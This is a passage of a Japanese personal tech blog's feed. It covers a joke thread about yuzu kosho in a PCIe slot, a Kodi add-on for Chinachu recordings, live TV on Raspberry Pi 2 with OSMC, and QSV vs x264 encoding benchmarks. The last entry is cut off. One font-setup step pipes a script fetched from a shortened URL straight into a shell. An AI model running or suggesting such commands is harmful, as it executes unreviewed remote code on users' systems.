<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> マジレスすると歯ブラシはやめておいたほうがいいっす。ホコリとろうとしてやったら中のピンが大変なことに…（AGPスロットだったけど）</p>&mdash; salexkidd (@salexkidd) <a href="https://twitter.com/salexkidd/status/573720752198840320">2015, 3月 6</a></blockquote>


<p>確かに細かいピンが並んでるPCIeスロットは下手に歯ブラシでこすると傷つけたりピン折れたりしそうなので、たとえ柚子胡椒が入り込んでもおっしゃる通りやめておきましょう。</p>

<h2>つけ置き</h2>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 失礼します。精製水の方が良いのはその通りですが、水道水で洗う人もいて、通常なんてことはないのでこの際気にしないで良いのでは。柚子胡椒はちゃんと落とさないと腐蝕の原因になると思いますが。買い出しに行って水に漬けっぱなしの方が心配。</p>&mdash; アキ (@Jaguaimo) <a href="https://twitter.com/Jaguaimo/status/573741851758366720">2015, 3月 6</a></blockquote>


<p>密かに隠れている柚子胡椒成分が染み出している場合なども考えると、つけ置きは良くないということですね。常識的に考えてもマザーボードをつけ置きするなんてこと聞いたことないですし、やめておくのが得策です。</p>

<h1>先駆者の言葉</h1>

<blockquote class="twitter-tweet" lang="ja"><p>PCIもPCIeもそんなチャチな節点じゃないよ。LGAも</p>&mdash; ふぁるす (@sushi514) <a href="https://twitter.com/sushi514/status/573738766453473280">2015, 3月 6</a></blockquote>


<h1>対策</h1>

<blockquote class="twitter-tweet" lang="ja"><p>俺も柚子胡椒を振る時はちゃんとキャップ閉めよう</p>&mdash; やまじゅん (@MtJune11) <a href="https://twitter.com/MtJune11/status/573737721786593280">2015, 3月 6</a></blockquote>


<p>以上です。</p>

<h1>おすすめ柚子胡椒</h1>

<h2>瓶入り</h2>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 柚子胡椒はびん入りのがあるので、アキバの日本百貨店あたりでGetできるかと。あっちのほーが色々便利かもよ？</p>&mdash; タモ＝サーン (@tamosan) <a href="https://twitter.com/tamosan/status/573781580545593345">2015, 3月 6</a></blockquote>


<p>瓶入りなので振ってPCIスロットに詰まるという事故が防げます。</p>

<h2>ゆずすこ</h2>

<blockquote class="twitter-tweet" lang="ja"><p>福岡土産でもらった覚えがあるけど、柚子胡椒にお酢を加えてタバスコ風にしたYUZUSCO（ゆずすこ）っていう調味料があるよ</p>&mdash; mzsm (@mzsm_j) <a href="https://twitter.com/mzsm_j/status/573736798838484992">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" lang="ja"><p>液体の柚子胡椒「ゆずすこ」 ゆずすこ [楽天] <a href="http://t.co/dRvymRSKzH">http://t.co/dRvymRSKzH</a> <a href="https://twitter.com/hashtag/RakutenIchiba?src=hash">#RakutenIchiba</a> <a href="http://t.co/2xHIh09Xpe">pic.twitter.com/2xHIh09Xpe</a></p>&mdash; mzsm (@mzsm_j) <a href="https://twitter.com/mzsm_j/status/573738420742193152">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/tamosan">@tamosan</a> <a href="https://twitter.com/mzyy94">@mzyy94</a> <a href="http://t.co/juLQl708Lx">http://t.co/juLQl708Lx</a>　あとはゆずすこ なんてものも…</p>&mdash; greenz(修験者) (@greenz_greenz) <a href="https://twitter.com/greenz_greenz/status/573782317505757185">2015, 3月 6</a></blockquote>


<p>酢が入った液体の柚子胡椒もあるようです。これなら粘性が低そうなので取り除きやすいかもしれません。</p>

<h2>赤いゆずこしょう</h2>

<blockquote class="twitter-tweet" lang="ja"><p>赤もありました：高山物産 の 高山さんの赤いゆずごしょう（柚子胡椒赤）120g を Amazon でチェック！ <a href="http://t.co/MOULMnZQO8">http://t.co/MOULMnZQO8</a></p>&mdash; 対テロ戦争 (@syuu1228) <a href="https://twitter.com/syuu1228/status/573740978680393728">2015, 3月 6</a></blockquote>


<p>赤い柚子胡椒もあるそうです。これならマザーボードに詰まっても見つけやすく、取り残しの心配が減りますね。</p>

<h2>S&amp;B柚子こしょう40g</h2>

<iframe src="http://rcm-fe.amazon-adsystem.com/e/cm?lt1=_blank&bc1=000000&IS2=1&bg1=FFFFFF&fc1=000000&lc1=0000FF&t=mzyy-22&o=9&p=8&l=as4&m=amazon&f=ifr&ref=ss_til&asins=B0084J95W8" style="width:120px;height:240px;" scrolling="no" marginwidth="0" marginheight="0" frameborder="0"></iframe>


<p>今回登場した柚子胡椒です。PCIスロットに入りやすいのでご注意ください。</p>

<h1>まとめ</h1>

<blockquote class="twitter-tweet" lang="ja"><p>柚子胡椒のためになんで野口3枚も飛ばさにゃならんのだ。。</p>&mdash; PCI柚子胡椒職人 (@mzyy94) <a href="https://twitter.com/mzyy94/status/573765816887345152">2015, 3月 6</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>




<blockquote class="twitter-tweet" lang="ja"><p>@各位&#10;&#10;届きましたのでご報告です <a href="http://t.co/NEzVslGQpf">pic.twitter.com/NEzVslGQpf</a></p>&mdash; PCI柚子胡椒職人 (@mzyy94) <a href="https://twitter.com/mzyy94/status/573999511258861569">2015, 3月 7</a></blockquote>




<blockquote class="twitter-tweet" lang="ja"><p>@贈り物をして下さった方々&#10;&#10;最高の調味料各種を確認いたしました。 <a href="http://t.co/P5rxR8xkkP">pic.twitter.com/P5rxR8xkkP</a></p>&mdash; PCI柚子胡椒職人 (@mzyy94) <a href="https://twitter.com/mzyy94/status/574001187554390016">2015, 3月 7</a></blockquote>




<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[KodiでChinachuの録画を観るAdd-on作った]]></title>
    <link href="http://mzyy94.com/blog/2015/02/24/kodi-chinachu-addon/"/>
    <updated>2015-02-24T19:28:35+09:00</updated>
    <id>http://mzyy94.com/blog/2015/02/24/kodi-chinachu-addon</id>
    <content type="html"><![CDATA[<p>Raspberry Pi2でKodi（旧：XBMC)が快適に動き、地デジのLIVE視聴環境として優れているので、
Chinachuの本領である録画した動画の視聴したみが高まってきました。</p>

<p>Kodiには簡単にAdd-onが作れる仕組みがあり、動画や音楽のコンテンツを独自で配信・管理する仕組みがつくれます。
Chinachuには録画ファイルの情報とストリーミング視聴ができるREST APIが搭載されているので、
これを叩いてKodiで動画コンテンツを視聴できるAdd-onを作ったのでお知らせいたします。</p>

<!-- more -->


<h1>Kodi/XBMC Add-on</h1>

<p>KodiではPythonを用いてGUIやコンテンツを操るAdd-onを作成できるようになっています。
Add-on作成に関する情報は<a href="http://kodi.wiki/view/Add-on_development">Add-on development - Kodi</a>にあるので、作成はそこまで難しくないです。
コンテンツ管理プラグインの他にも、スキンやバックグラウンドサービスも同じAdd-onの構造で作成できるので興味がある人は作ってみてください。</p>

<h1>Chinachu client add-on</h1>

<p>ChinachuのREST APIを叩いて動画を取得してコンテンツ一覧に表示、再生、そしてChinachuサーバー上の録画データを削除できるAdd-onを作成しました。</p>

<p><strong><a href="https://github.com/mzyy94/plugin.video.chinachu">https://github.com/mzyy94/plugin.video.chinachu</a></strong></p>

<p>Releaseのページからダウンロードして設定のアドオンからzipファイルからインストールでインストールしてください。
その後、有効なアドオンの一覧からビデオアドオンにあるChinachu clientを探し、設定を開いてChinachuの動くサーバーのアドレスとその他オプションを設定すると利用できるようになります。</p>

<h2>使い方</h2>

<p>利用方法は、Kodiトップにあるビデオメニューの中のビデオアドオンからChinachu clientを起動するだけです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/24/launch-chinachu-client.png" alt="Launch Chinachu client" /></p>

<p>一覧の動画を選択した状態で右クリックを押すかメニューを表示すると、メニュー中に削除の項目があります。
これを選択すると、確認ダイアログ表示の後、Chinachuで管理されている<strong>録画ファイルと録画情報の両方を削除</strong>します。
キャンセルはできないのでご注意を。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/24/deletion-dialog.png" alt="File deletion" /></p>

<h2>設定</h2>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/24/configuration-window.png" alt="Configuratoin window" /></p>

<p>Chinachu clientには幾つか設定を設けてあります。</p>

<h3>基本</h3>

<p>基本となるChinachuのURLの設定は必須です。Chinachu-WUIのAPIを叩くので、プロトコルとポート番号を含めたURLを設定してください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/24/general-configuration.png" alt="General configuratoin" /></p>

<h3>ストリーミング</h3>

<p>ストリーミングカテゴリにはChinachu WUIでストリーミングする際に指定するものと同じ感覚で設定してください。
MPEG-2 ハードウェアデコーダーを導入してあるRasPi2ではこのオプションは未設定の方が良いと思います。</p>

<h3>サムネイル</h3>

<p>サムネイルカテゴリには、Chinachu APIのpreview.jpgを取得してKodiのサムネイルフォルダにキャッシュするオプションがあります。
avconvで生成している都合上、取得には時間がかかるので必要でなければ無効のままにしておくことをお勧めします。
また、一度サムネイルを取得し始めるとKodiを終了するまでバックグラウンドで取得し続けます。さらに、未取得のサムネイルは毎回取得しに行きます。
この点ご注意ください。</p>

<p>サムネイルが不要になった際は、キャッシュのクリアもできます。</p>

<h3>動画情報</h3>

<p>動画情報カテゴリでは、動画情報に関する細かなオプションがあります。</p>

<p>エピソード番号を強制的に指定オプションは、一部のテーマ向けの設定です。
放送日がエピソード番号が指定されていないと表示されないテーマがあるため、放送日が表示されない動画がある場合は有効にしてください。
このオプションが有効の場合、バラエティ番組など連続したエピソードがない放送にエピソード番号に1を指定します。</p>

<p>チャンネル名を表示する場所を選択するオプションも、一部のテーマ向けの設定です。
通常、チャンネル名はスタジオとして動画情報に登録されている場合、動画の詳細情報に表示されるのですが、テーマによってはスタジオを表示しないものがあるようです。
チャンネル名が表示されないなと思ったらこのオプションをいじってみてください。</p>

<h2>動作してる図</h2>

<p>こんなかんじです。
スキンは一番上はConfluenceで他はTitanです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/24/preview1.png" alt="Preview1" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/24/preview2.png" alt="Preview2" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/24/preview3.png" alt="Preview3" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/24/preview4.png" alt="Preview4" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/24/preview5.png" alt="Preview5" /></p>

<h1>まとめ</h1>

<p>Raspberry Pi2は買いである</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[KodiとChinachuで地デジLive視聴 on Raspberry Pi2 w/ OSMC]]></title>
    <link href="http://mzyy94.com/blog/2015/02/21/kodi-livetv-chinachu/"/>
    <updated>2015-02-21T07:02:43+09:00</updated>
    <id>http://mzyy94.com/blog/2015/02/21/kodi-livetv-chinachu</id>
    <content type="html"><![CDATA[<p>どうも、Raspberry Pi2で遊ぶ毎日が続いております。
Raspberry Pi model B（2ではない）にRaspbmcを入れて昨年の夏頃からChinachu経由で地上デジタル放送を視聴する環境を構築していたのですが、
いかんせんスペックが低く、チャンネル切り替え時などにもたついていました。</p>

<p>Raspberry Pi2が発売され、従来の6倍のパフォーマンスが発揮できるようになり、もたつきがなく不便しなくなってきたので、
Raspbmc改めOSMCで地デジ視聴をする方法をまとめます。</p>

<!-- more -->


<h1>PVRクライアント</h1>

<p>Kodi(旧:XBMC)にはテレビ放送を視聴するためのPVRクライアントという機能があります。
テレビ放送の配信携帯に合わせていくつかPVRクライアントがAdd-onとして提供されていますが、汎用的につかえるものに
<a href="https://github.com/afedchin/xbmc-addon-iptvsimple/">XBMC IPTV Simple Client</a>というものがあります。</p>

<p>XBMCからKodiに名称変更した際に、Kodi本体にこれらのPVRクライアントはあらかじめバンドルされるようになり、
これまでは各自ビルドしてインストールしていたのが、設定して有効化するだけで使えるようになっています。
もちろんこのIPTV Simple Clientもバンドルされています。これを使って地デジを視聴する環境を構築します。</p>

<h2>IPTV Simple Client</h2>

<p>このAdd-onは、m3u形式で配信されているチャンネル配信情報と、<a href="http://wiki.xmltv.org/index.php/XMLTVFormat">XMLTV形式</a>で配信されている番組表情報を用いてネットワーク経由でテレビを視聴することができるPVRクライアントです。
数あるプレイリストフォーマットの中でも一般的な形式であるm3uと、<a href="http://www.mythtv.org/">MythTV</a>などのテレビ視聴・録画クライアントがサポートするEPG番組表形式であるXMLTVを用いているため、テレビ放送配信側となるサーバーがサポートしていれば簡単に地デジをKodiで視聴できます。</p>

<p>今回テレビ放送を配信するサーバーとしてはChinachuを使いますが、残念ながら上記のm3u形式のチャンネル情報とXMLTV形式の番組表情報は提供されていません。
なので、Chinachuに2つのファイルを追加して機能を追加することで対応するようにしました。</p>

<h1>Chinachu</h1>

<p>数ある地デジ録画管理ソフトウェアの中でもモダンなデザインで、使い勝手がよくREST APIを提供している素敵なソフトウェアです。
Chinachuは番組の録画・再生が主な機能とされていますが、現在放送中の番組の視聴にも対応しており、APIを経由することでいろいろなクライアントから再生することができます。
しかし、前途の通りChinachuが提供するAPIでは、IPTV Simple Clientが対応するm3u形式のプレイリストやXMLTV形式の番組表情報は取得できません。
幸いなことに、ChinachuへのAPIの追加は難しくなく、Chinachuが動作するディレクトリ直下にある<strong>api</strong>ディレクトリにAPIリソース情報とスクリプトを配置することで必要なAPIを追加することができます。</p>

<p>IPTV Simple Clientに必要な、</p>

<ul>
<li>m3u形式でのチャンネル配信情報</li>
<li>XMLTV形式での番組表情報</li>
</ul>


<p>の二つをAPIで提供するファイルを作りました。
以下からダウンロードしてapiディレクトリのファイルをChinachuのapiディレクトリに放り込んでください。</p>

<p><em><a href="https://github.com/mzyy94/Chinachu-IPTV-API-addon">https://github.com/mzyy94/Chinachu-IPTV-API-addon</a></em></p>

<p>これを導入すると、</p>

<ul>
<li><code>/api/iptv/channel.m3u8</code>にチャンネル配信情報</li>
<li><code>/api/iptv/epg.xml</code>にXMLTV情報</li>
</ul>


<p>が提供されるようになります。</p>

<h1>KodiでSimple IPTV Clientの設定</h1>

<p>サーバー側の準備は整ったのでKodiの方の設定をします。前回の記事で日本語化したRaspberry Pi2で動くOSMC上のKodiでの設定方法になります。</p>

<p>上記の通り、KodiにはPVRクライアントが導入されているので、Add-on管理から設定をして有効化するだけで準備ができます。</p>

<p>まず、設定のAdd-onの中にある無効なアドオンからPVR Simple IPTV Clientを探して選択し、設定画面を開きます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/21/disabled-addons.png" alt="Disabled add-ons" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/21/iptv-simple-client-addon.png" alt="IPTV Simple client" /></p>

<p>設定画面にあるM3UプレイリストのURLとXMLTV URLにChinachuのWUIが動作するURLに続けて、下図のように設定します。
各自環境に合わせて<code>chinachu:10772</code>の部分を書き換えてください。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/21/addon-configure1.png" alt="Add-on configure1" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/21/addon-configure2.png" alt="Add-on configure2" /></p>

<p>設定を終えたらSimple IPTV Clientの<strong>有効</strong>を選択して有効にし、Kodiの全体の設定にあるLive TV設定に移動してLCD有効(誤訳？)すると、
トップの画像のようにライブTVの項目が現れ、PVRが利用できるようになります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/21/enable-pvr.png" alt="Enable PVR" /></p>

<p>m3uプレイリストとしてAPIが提供するチャンネルは、Chinachuの設定ファイルに記載の通りの順番でサブチャンネル含め配信しているので、
後日紹介するであろうリモコンを使ってチャンネル切り替えを行う場合は、Live TV設定のチャンネルマネージャーからグループ管理を行って、
不要なチャンネルを隠すことでリモコンでの操作に適したチャンネルのみを切り替え可能にできます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/21/channel-manager1.png" alt="Channel Manager1" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/21/channel-manager2.png" alt="Channel Manager2" />
<img src="http://mzyy94.com/blog/resources/images/2015/02/21/channel-manager3.png" alt="Channel Manager3" /></p>

<p>ここまで終わった状態で、Kodiのトップに移動するとライブTVの項目が増えているはずです。これを選択すると、デフォルトではEPG番組表が表示されます。
Kodi上でキーボードのEを押すと同じようにEPG番組表が表示されます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/21/pvr-epg.png" alt="PVR EPG view" /></p>

<p>ここで、バックスペースキーを押すとチャンネル一覧を表示するメニューが現れるので、そちらに切り替えると現在放送中の番組情報が表示されます。
もしくはキーボードのHを押すことでチャンネル一覧が表示できます。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/21/pvr-channel.png" alt="PVR Channel view" /></p>

<p>ここで好きなようにチャンネルを切り替え、地デジを観ることができます。</p>

<h1>まとめ</h1>

<p>MPEG-2ライセンスを導入してあるRaspberry Pi2だとサクサク地デジが見られる。</p>

<blockquote class="twitter-tweet"><p>Raspberry Pi 2での地デジ視聴時の負荷&#10;HWデコーダー有効にするとフレームドロップなしでCPU負荷はほぼゼロ <a href="http://t.co/rAzv7eCTGW">pic.twitter.com/rAzv7eCTGW</a></p>&mdash; 犬みっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/565610656809091072">February 11, 2015</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Raspberry Pi2にOSMC入れてKodi(旧:XBMC)日本語化するまで]]></title>
    <link href="http://mzyy94.com/blog/2015/02/16/raspberry-pi2-osmc-jp/"/>
    <updated>2015-02-16T20:05:56+09:00</updated>
    <id>http://mzyy94.com/blog/2015/02/16/raspberry-pi2-osmc-jp</id>
    <content type="html"><![CDATA[<p>今月頭の発表で一気に盛り上がりを見せた<a href="http://www.raspberrypi.org/products/raspberry-pi-2-model-b/">Raspberry Pi 2 Model B</a>。もちろん発売日に購入しました。
手元にはRaspberry Pi BとGalileo Gen2の2つのLinuxが動く小型ボードがあるんですが、主にメディアセンター用途で使おうとしていたRaspberry Pi Bに性能面で不満を抱いていたため、今回この新バージョン購入は即決しました。</p>

<p>Raspberry Piでのメディアセンター用途で代表的なのは<a href="http://www.raspbmc.com/">Raspbmc</a>ですが、
このプロジェクトは<a href="https://osmc.tv/about/">OSMC</a>に移行するようで、2015年2月2日のFinalリリースの配布をもって終了となりました。</p>

<p>ということで、Raspberry Pi 2 Model B(以下、RPi2B)にOSMCを導入して日本語化するまでのメモを残します。</p>

<!-- more -->


<h1>OSMCインストール</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/16/osmc-installer.png" alt="OSMC Installer" /></p>

<p>OSMCは<a href="https://osmc.tv/download/">https://osmc.tv/download/</a>からインストーラーがダウンロードできるので、自分の使ってるOSにあったインストーラーをダウンロード・実行して、microSDHCにイメージを書き込むだけです。2015/2/16時点での最新版であるAlpha 4をインストールしました。</p>

<h1>日本語化</h1>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/16/osmc-mainmenu.png" alt="OSMC main menu" /></p>

<p>起動するとこんな感じです。OSMCテーマ標準のフォントは流行りのLightなウェイトを持つRobotoとOpenSansが利用されているため、もちろんのこと日本語は表示できません。
テーマのデザインを損ねることなく、日本語でも美しい細字のフォントで表示したく思い、<a href="http://mplus-fonts.sourceforge.jp/mplus-outline-fonts/index.html">M+ FONT</a>を利用することにしました。</p>

<p>M+ FONTはJIS第一水準までの漢字を網羅し、極細から極太まで7種のウェイトを収録した美しいフリーフォントです。
LightウェイトフォントでJIS第二水準まで含むオープンなフォントはAdobeとGoolgeが共同で開発・公開している<a href="https://www.google.com/get/noto/cjk.html">Noto Sans CJK</a>/<a href="https://github.com/adobe-fonts/source-han-sans/tree/release">Source Han Sans</a>があります。しかし、OpenTypeフォントとしての配布である上に、TrueTypeに変換しても18MB前後のフォントファイルとなってしまい、Kodiで読み込めないことを確認したのでM+ FONTを利用します。</p>

<p>M+ FONTを利用するため、OSMC上で以下のスクリプトを実行するか、<code>curl -L http://git.io/pjg5 | sh -</code>とするとデフォルトフォントをM+ FONTに差し替えられます。
OSMCへはSSHで（USER/PASSともに<code>osmc</code>）ログインしてください。※パスワードの変更をお忘れなく。</p>

<script src="https://gist.github.com/mzyy94/15ee1b3880107e9d7ece.js"></script>


<p>このあと、Settings->Appearance->International->Japaneseとすることで、以下のような美しい日本語メニューが表示されるようになります。</p>

<p>（本当は日本語化したくてやったんじゃなく、次の記事で紹介する地デジの番組表情報が表示されるようにするために日本語フォントが必要で導入したので、表示確認後英語表記に戻しました。）</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/02/16/osmc-mainmenu-jp.png" alt="OSMC JP" /></p>

<h1>MPEG-2ライセンス購入</h1>

<p>メディアプレイヤー用途として使うにはMPEG-2のハードウェアデコードを有効化して、快適に動画（地デジ）再生ができるようにしたいと思い、ライセンスを購入しました。</p>

<p>Raspberry PiはMPEG-2ハードウェアデコーダーの利用にライセンス料を課しているので、£2.40支払ってキーを入手します。
<a href="http://www.raspberrypi.com/mpeg-2-license-key/">ライセンスキーストア</a>にシリアル番号を入力してカートに入れ購入手続きし、深夜にでも送られてくるであろうシリアルキーを、
<code>echo decode_MPG2=0xdeadbeef | sudo tee -a /boot/config.txt</code>のようにしてハードウェア設定ファイルに追記し再起動してハードウェアデコーダーを有効にします。</p>

<p>これで快適に地デジなどの動画が再生できるようになります。</p>

<h1>次回予告</h1>

<p>Raspberry Pi 2で地デジ視聴する</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LinuxでQSVとH.264のエンコード対決]]></title>
    <link href="http://mzyy94.com/blog/2015/01/31/qsv-x264-linux-battle/"/>
    <updated>2015-01-31T19:23:04+09:00</updated>
    <id>http://mzyy94.com/blog/2015/01/31/qsv-x264-linux-battle</id>
    <content type="html"><![CDATA[<p>先日の記事、でLinuxでH.264の動画をエンコードできることを紹介しました。
そのベンチマークをとってみました。QSVでのエンコードとlibx264を用いたエンコードの比較となります。</p>

<p>今回エンコード時間の比較に用いた動画は以下のものを利用しました。</p>

<p><em><a href="http://www.bigbuckbunny.org">Big Buck Bunny</a></em></p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/31/big-buck-bunny.png" alt="Big Buck Bunny" /></p>

<p>ここの、<code>big_buck_bunny_1080p_surround.avi</code>を以下の表のオプションでLibx264とQSVでのエンコードで変換し、比較をしてみました。</p>

<table>
<thead>
<tr>
<th style="text-align:center;">項目 </th>
<th style="text-align:center;"> 値</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">音声コーデック</td>
<td style="text-align:center;"> コピー</td>
</tr>
<tr>
<td style="text-align:center;">ビットレート</td>
<td style="text-align:center;">2000kbps</td>
</tr>
<tr>
<td style="text-align:center;">サイズ</td>
<td style="text-align:center;"> 1280x720</td>
</tr>
<tr>
<td style="text-align:center;">フレームレート</td>
<td style="text-align:center;"> 29.97</td>
</tr>
</tbody>
</table>


<p>このオプションで起動すると、<strong>ffmpeg -i big_buck_bunny_1080p_surround.avi -acodec copy -vcodec コーデック -b:v 2000k -s 1280x720 -r 30000/1001 -y 出力ファイル</strong>という起動オプションになります。</p>

<!-- more -->


<h1>仮想8コアでx264エンコード</h1>

<p>Xeon搭載マシンで動かしているKVMに仮想8コアを割り当てた環境でエンコードしてみました。
FFmpegの粋な計らいによって、エンコード中は以下のようにたくさんのスレッドが立ちがあり、マシンはエンコードに専念していました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/31/x264-8core-encode.png" alt="x264 8core encode" /></p>

<p>CPUはエンコード中、全コア90%前後の使用率を維持していました。そんなエンコードにかかった時間は以下の通りでした。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>real    2m50.118s
</span><span class='line'>user    20m15.617s
</span><span class='line'>sys     0m7.375s</span></code></pre></td></tr></table></div></figure>


<p>10分の動画を3分足らずでエンコードしてしまいました。恐るべきコア数の暴力。</p>

<h1>仮想8コアでQSVエンコード</h1>

<p>先ほどと同じ環境でQSVを用いたエンコードをしてみました。
こちらもFFmpegによって複数のスレッドによる処理がされるのですが、CPUの負荷は多くて各コア10%程度となる非常に省エネなエンコードとなっていました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/31/qsv-8core-encode.png" alt="QSV 8core encode" /></p>

<p>こんな省エネでもエンコードに要する時間はそれほどかかりませんでした。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>real    3m6.697s
</span><span class='line'>user    2m56.301s
</span><span class='line'>sys     0m4.871s</span></code></pre></td></tr></table></div></figure>


<p>3分とちょっとでエンコードが完了しています。さすがにXeon 8コアにはかなわないようです。</p>

<h1>仮想1コアでx264エンコード</h1>

<p>KVMで割り当てコア数を1コアに設定し、x264を用いたエンコードをしてみました。
負荷はほぼ100%、まれに90%前後になる程度でした。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/31/x264-1core-encode.png" alt="x264 1core encode" /></p>

<p>じっくりエンコードしてかかった時間は以下のとおりです。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>real    10m56.739s
</span><span class='line'>user    10m54.374s
</span><span class='line'>sys     0m1.070s</span></code></pre></td></tr></table></div></figure>


<p>動画再生時間+10%程度の時間がかかっていました。</p>

<h1>仮想1コアでQSVエンコード</h1>

<p>QSVとコア数の関係性は不明ながら、比較のために同じ環境でQSVでもエンコードしてみました。
負荷はほとんどないかと思ってたのですが、エンコーダに渡す前処理などで少々CPUを使うようで、90%前後まで達したり0%付近をうろうろしたりと、不安定な負荷がかかっていました。また、なぜか2スレッドで処理していました。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/31/qsv-1core-encode.png" alt="qsv 1core encode" /></p>

<p>要した時間は以下のとおりです。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>real    3m0.692s
</span><span class='line'>user    2m35.944s
</span><span class='line'>sys     0m0.972s</span></code></pre></td></tr></table></div></figure>


<p>予想はついていましたが、QSVでは8コアでも1コアでもほとんど時間は変わらないようです。</p>

<h1>仮想1コアで複数のQSVエンコード&#8230;?</h1>

<p>記事公開直後にこのような気になる意見をいただきました。</p>

<blockquote class="twitter-tweet"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 一コア使用QSVで複数同時エンコしたらどうなるか実験してもらえるとうれしいです</p>&mdash; の (@polamjag) <a href="https://twitter.com/polamjag/status/561469823561920513">January 31, 2015</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>早速、QSVでの同時エンコードを試してみました。
tmuxで分割し、上下のコンソールで同時にエンコードを開始してみた結果が以下の画像のとおりになります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/01/31/qsv-1core-multi-encode.png" alt="qsv 1core multi encode" /></p>

<p>ライブラリがIGPへアクセスできないようでアクセス違反起こして終了してしまうため、QSVでの同時エンコードはダメでした。</p>

<h2>ファイルサイズ比較</h2>

<p>ビットレート固定なのでそれほど違いはありませんが、ファイルサイズは以下のようになっています。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls -l
</span><span class='line'>total 1261812
</span><span class='line'>-rw-rw-r--. 1 ninniku ninniku 928670754 May  6  2008 big_buck_bunny_1080p_surround.avi
</span><span class='line'>-rw-rw-r--. 1 ninniku ninniku 179373021 Jan 31 02:27 big_buck_bunny_qsv.mp4
</span><span class='line'>-rw-rw-r--. 1 ninniku ninniku 184045287 Jan 31 02:23 big_buck_bunny_x264.mp4</span></code></pre></td></tr></table></div></figure>


<p>QSVでエンコードしたほうが4MBほどファイルサイズが小さくなっていました。</p>

<h1>品質について</h1>

<p>x264とQSVの比較では目立った差異は見受けられなかったです。視力の問題かもしれませんが。</p>

<h1>まとめ</h1>

<p>動画再生時間の3分の1程度でエンコードができるQSVはLinuxでもすごい。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Intel QSVのH.264エンコードをLinuxで！]]></title>
    <link href="http://mzyy94.com/blog/2015/01/30/intel-qsv-on-linux/"/>
    <updated>2015-01-30T22:22:03+09:00</updated>
    <id>http://mzyy94.com/blog/2015/01/30/intel-qsv-on-linux</id>
    <content type="html"><![CDATA[<p><a href="http://mzyy94.com/blog/2014/12/12/kvm-intel-hd-graphics-passthrough/">前回の記事</a>から1ヶ月以上空いてしまいました。遅ればせながらで申し訳ありません。続編です。
Intel QSVは高速にある程度の画質のエンコードできてよいです。とても。</p>

<p>今回はKVMでIntel HD Graphicsをパススルーした仮装マシン上に、SDKのインストールとカーネルモジュールのインストール、そしてffmpegでのQSVによるH.264エンコードができる環境づくりまでの手順をご紹介します。
<del>これが意外と骨が折れる作業だったので同じような思いをせぬよう、ご熟読ください。</del>（書き直す前の文章です。書き直した理由は後述。）</p>

<!-- more -->


<h1>Intel Media Server Studio (Intel Media SDK)</h1>

<p>前回の記事で紹介したIntel Media Server Studio(以下、IMSS。旧Intel Media SDK)のインストールをします。
